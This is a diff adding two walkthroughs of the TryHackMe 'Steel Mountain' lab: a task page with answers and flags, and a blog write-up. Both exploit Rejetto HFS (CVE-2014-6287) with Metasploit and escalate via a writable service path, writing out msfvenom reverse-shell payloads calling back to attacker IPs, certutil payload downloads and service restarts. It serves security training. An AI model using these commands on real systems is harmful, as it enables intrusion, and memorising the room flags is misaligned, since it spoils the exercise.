@@ -1453,3 +1453,287 @@ Congratulations -- you hacked Atlas!
 This was a beginner box which has hopefully provided you with some skills which will prove useful as you progress in your hacking journey. We covered initial exploitation of outdated software, as well as exploiting the Windows PrintSpooler and dumping password hashes with Mimikatz.
 
 Kudos for completing the room: now go hack some more!
+Task 1
+Introduction
+
+Start Machine
+
+
+In this room you will enumerate a Windows machine, gain initial access with Metasploit, use Powershell to further enumerate the machine and escalate your privileges to Administrator.
+
+If you don't have the right security tools and environment, deploy your own Kali Linux machine and control it in your browser, with our Kali Room.
+
+Please note that this machine does not respond to ping (ICMP) and may take a few minutes to boot up.
+
+Answer the questions below
+Deploy the machine.
+
+Who is the employee of the month?
+
+Bill Harper
+
+Correct Answer
+
+Task 2
+Initial Access
+Now you have deployed the machine, lets get an initial shell!
+
+Answer the questions below
+Scan the machine with nmap. What is the other port running a web server on?
+
+8080
+
+Correct Answer
+Take a look at the other web server. What file server is running?
+
+Rejetto HTTP File Server
+
+Correct Answer
+What is the CVE number to exploit this file server?
+
+2014-6287
+
+Correct Answer
+
+Use Metasploit to get an initial shell. What is the user flag?
+
+b04763b6fcf51fcd7c13abc7db4fd365
+
+Correct Answer
+
+Task 3
+Privilege Escalation
+Now that you have an initial shell on this Windows machine as Bill, we can further enumerate the machine and escalate our privileges to root!
+
+Answer the questions below
+To enumerate this machine, we will use a powershell script called PowerUp, that's purpose is to evaluate a Windows machine and determine any abnormalities - "PowerUp aims to be a clearinghouse of common Windows privilege escalation vectors that rely on misconfigurations."
+
+You can download the script here.  If you want to download it via the command line, be careful not to download the GitHub page instead of the raw script. Now you can use the upload command in Metasploit to upload the script.
+
+
+
+To execute this using Meterpreter, I will type load powershell into meterpreter. Then I will enter powershell by entering powershell_shell:
+
+
+
+No answer needed
+
+Correct Answer
+Take close attention to the CanRestart option that is set to true. What is the name of the service which shows up as an unquoted service path vulnerability?
+
+AdvancedSystemCareService9
+
+Correct Answer
+The CanRestart option being true, allows us to restart a service on the system, the directory to the application is also write-able. This means we can replace the legitimate application with our malicious one, restart the service, which will run our infected program!
+
+Use msfvenom to generate a reverse shell as an Windows executable.
+
+msfvenom -p windows/shell_reverse_tcp LHOST=CONNECTION_IP LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe
+
+Upload your binary and replace the legitimate one. Then restart the program to get a shell as root.
+
+Note: The service showed up as being unquoted (and could be exploited using this technique), however, in this case we have exploited weak file permissions on the service files instead.
+
+No answer needed
+
+Correct Answer
+What is the root flag?
+
+9af5f314f57607c00fd09803a587db80
+
+Correct Answer
+
+Task 4
+Access and Escalation Without Metasploit
+Now let's complete the room without the use of Metasploit.
+
+For this we will utilise powershell and winPEAS to enumerate the system and collect the relevant information to escalate to
+
+Answer the questions below
+To begin we shall be using the same CVE. However, this time let's use this exploit.
+
+*Note that you will need to have a web server and a netcat listener active at the same time in order for this to work!*
+
+
+
+To begin, you will need a netcat static binary on your web server. If you do not have one, you can download it from GitHub!
+
+You will need to run the exploit twice. The first time will pull our netcat binary to the system and the second will execute our payload to gain a callback!
+
+
+No answer needed
+
+Correct Answer
+Congratulations, we're now onto the system. Now we can pull winPEAS to the system using powershell -c.
+
+Once we run winPeas, we see that it points us towards unquoted paths. We can see that it provides us with the name of the service it is also running.
+
+
+
+ 
+
+What powershell -c command could we run to manually find out the service name?
+
+*Format is "powershell -c "command here"*
+
+powershell -c "Get-Service"
+
+Correct Answer
+Now let's escalate to Administrator with our new found knowledge.
+
+Generate your payload using msfvenom and pull it to the system using powershell.
+
+
+Now we can move our payload to the unquoted directory winPEAS alerted us to and restart the service with two commands.
+
+First we need to stop the service which we can do like so;
+
+sc stop AdvancedSystemCareService9
+
+Shortly followed by;
+
+sc start AdvancedSystemCareService9
+
+Once this command runs, you will see you gain a shell as Administrator on our listener!
+
+No answer needed
+
+Correct Answer
+TryHackMe: Steel Mountain Walkthrough
+Akshat Gupta
+Akshat Gupta
+
+Follow
+5 min read
+·
+Nov 19, 2021
+74
+
+
+1
+
+
+
+We will solve this room from TryHackMe, Steel Mountain.
+
+
+Starting off with deploying the machine and quickly scanning the open ports with rustscan,
+
+rustscan -a 10.10.240.220 — ulimit 5000
+Press enter or click to view image in full size
+
+Rustscan result
+We got the open ports and now we can scan them in detail using nmap,
+
+nmap -sC -sV -p80,135,139,445,5985,8080,47001,49152,49153,49154,49155,49157,49163,49164 10.10.240.220 -oN nmap.log
+Press enter or click to view image in full size
+
+Press enter or click to view image in full size
+
+Result scan shows that port 80 is running webserver, port 139,445 is running SMB service, port 5985 is running MS HTTPAPI service, port 8080 is running HttpFileServer service.
+
+Let’s visit http://10.10.124.2,
+
+Press enter or click to view image in full size
+
+We landed on the page where we can see the picture of employee of the month. But after enumerating this website like looking at it’s source page, fuzzing it’s hidden directories, checking what technologies are there on this website, but I couldn’t find anything interesting.
+
+So I decided to visit to enumerate port 8080 by visiting http://10.10.124.2:8080,
+
+Press enter or click to view image in full size
+
+We landed on a page where HttpFileServer 2.3 is running and there is no file uploaded already on this website.
+
+So I decided to search for the service exploit on the ExploitDB for HttpFileServer 2.3 exploit, Rejetto HTTP File Server (HFS) 2.3.x — Remote Command Execution (2)
+
+Press enter or click to view image in full size
+
+CVE-2014–6287 : Rejetto HttpFileServer (HFS) is vulnerable to remote command execution attack due to a poor regex in the file ParserLib.pas. This module exploits the HFS scripting commands by using ‘%00’ to bypass the filtering. This module has been tested successfully on HFS 2.3b over Windows XP SP3, Windows 7 SP1 and Windows 8.
+
+There is also metasploit module for this exploit so I decided to first boot up the metasploit using msfconsole -q (neglecting the banner), and the search for the exploit,
+
+search rejetto
+Press enter or click to view image in full size
+
+There is a module. We can use this module to exploit the machine which is vulnerable to this service.
+
+Let’s use this module,
+
+use exploit/windows/http/rejetto_hfs_hxec
+Press enter or click to view image in full size
+
+Let’s set the options:
+
+set rhosts 10.10.240.220
+set lhost tun0
+set rhosts 8080
+Running the exploit using run and we got a shell,
+
+Press enter or click to view image in full size
+
+we got a meterpreter shell. Issuing getuid command and we got to know that we are STEELMOUNTAIN\bill user.
+
+Get Akshat Gupta’s stories in your inbox
+Join Medium for free to get updates from this writer.
+
+Enter your email
+Subscribe
+Okay, so now we got a meterpreter shell so we can drop into shell (which is cmd, default for windows) using shell command. Navigating to bill user desktop, we got the user flag,
+
+Press enter or click to view image in full size
+
+Now, that we are done with getting foothold process on machine, we now have to perform Privilege Escalation and to achieve this, we have to enumerate the system first. So Let’s upload the winpeas executable on the target machine using,
+
+upload /home/kali/vm_walkthrough/tryhackme/easy/steel_mountain/winpeas.exe
+Press enter or click to view image in full size
+
+winpeas.exe got uploaded on the machine.
+
+Let’s run this executable using winpeas.exe and after scrolling down the result, we can see that there are Unquoted Service Paths and bill user has permissions to write data/ create files on the directory making it’s easy for bill user to escalate privileges to Administrator user,
+
+Press enter or click to view image in full size
+
+Now question arises, What are Unquoted Service Path?
+
+When a service is created whose executable path contains spaces and isn’t enclosed within quotes, leads to a vulnerability known as Unquoted Service Path which allows a user to gain SYSTEM privileges (only if the vulnerable service is running with SYSTEM privilege level which most of the time it is).
+In Windows, if the service is not enclosed within quotes and is having spaces, it would handle the space as a break and pass the rest of the service path as an argument.
+
+Let’s try another command to confirm that there is Unquoted Service Path,
+
+wmic service get name,displayname,pathname,startmode |findstr /i “auto” | findstr /i /v “C:\windows\\” |findstr /i /v “””
+Press enter or click to view image in full size
+
+We can see that there is indeed an Unquoted Service Path and we can abuse this vulnerability to escalate our privilege to Administrator user by creating the file with same name as directory just before the service executable, Advanced.exe and windows will execute it first before even executing the original ASCService.exe and since our malicious file gets executed first, we will get a reverse shell.
+
+Let’s create a malicious payload using msfvenom,
+
+msfvenom -p windows/shell_reverse_tcp LHOST=10.9.3.171 LPORT=5555 -f exe -o Advanced.exe
+Press enter or click to view image in full size
+
+Our payload is generated and now is the time to transfer this payload into C:\Program Files (x86)\IObit directory. To transfer executable on target machine, first start the python server using python3 -m http.server and now we can use certutil command to transfer the payload,
+
+certutil -urlcache -f http://10.9.3.171:8080/Advanced.exe Advanced.exe
+Press enter or click to view image in full size
+
+Our malicious payload gets transferred successfully on the target machine.
+
+Now, let’s first start the netcat listener using nc -nvlp 5555 and then let’s stop the service using,
+
+sc stop AdvancedSystemCareService9
+Press enter or click to view image in full size
+
+The service is stopped.
+
+Starting the service again,
+
+sc start AdvancedSystemCareService9
+Press enter or click to view image in full size
+
+After starting the service again, we will get the reverse shell and issuing the whoami command, we get to know that we are system user,
+
+Press enter or click to view image in full size
+
+Now we can grab the Administrator user flag and we have successfully completed this challenge.
+
+Alas, I can put my pen down. If you find any mistake, feel free to correct me. Thanks and have a great day (:
+
